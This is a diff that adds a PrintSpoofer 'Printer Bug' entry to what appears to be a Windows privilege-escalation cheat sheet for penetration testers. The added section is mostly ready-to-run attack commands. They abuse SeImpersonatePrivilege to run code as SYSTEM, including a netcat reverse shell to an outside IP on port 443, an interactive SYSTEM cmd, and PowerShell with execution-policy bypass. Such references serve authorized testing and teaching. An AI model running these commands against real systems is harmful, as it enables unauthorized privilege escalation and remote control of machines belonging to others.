@@ -49,6 +49,7 @@
     * [Juicy Potato (Abusing the golden privileges)](#juicy-potato-abusing-the-golden-privileges)
     * [Rogue Potato (Fake OXID Resolver)](#rogue-potato-fake-oxid-resolver))
     * [EFSPotato (MS-EFSR EfsRpcOpenFileRaw)](#efspotato-ms-efsr-efsrpcopenfileraw))
+    * [PrintSpoofer (Printer Bug)](#PrintSpoofer-Printer-Bug)))
 * [EoP - Privileged File Write](#eop---privileged-file-write)
     * [DiagHub](#diaghub)
     * [UsoDLLLoader](#usodllloader)
@@ -1263,6 +1264,21 @@ C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe /platform:x86 EfsPotato.cs
 JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" > C:\juicypotatong.txt
 ```
 
+
+###  PrintSpoofer (Printer Bug)
+
+> this work if SeImpersonatePrivilege is enabled
+
+* Binary available at https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0
+
+```powershell
+# run nc -lnvp 443 then :
+.\PrintSpoofer64.exe -c "C:\Temp\nc64.exe 192.168.45.171 443 -e cmd"
+# without listener
+.\PrintSpoofer64.exe -i -c cmd
+# Via RPD
+.\PrintSpoofer64.exe -d 3 -c "powershell -ep bypass"
+```
 
 ## EoP - Privileged File Write
 
